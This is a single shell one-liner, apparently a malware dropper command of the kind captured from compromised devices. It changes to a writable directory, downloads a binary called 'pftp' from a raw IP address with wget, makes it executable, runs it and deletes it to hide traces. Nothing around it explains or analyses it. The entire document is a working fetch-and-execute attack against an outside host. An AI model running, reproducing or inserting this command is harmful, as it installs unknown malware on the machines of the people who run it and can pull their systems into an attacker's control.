cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.172.41.233/pftp; chmod +x pftp; ./pftp; rm -rf pftp
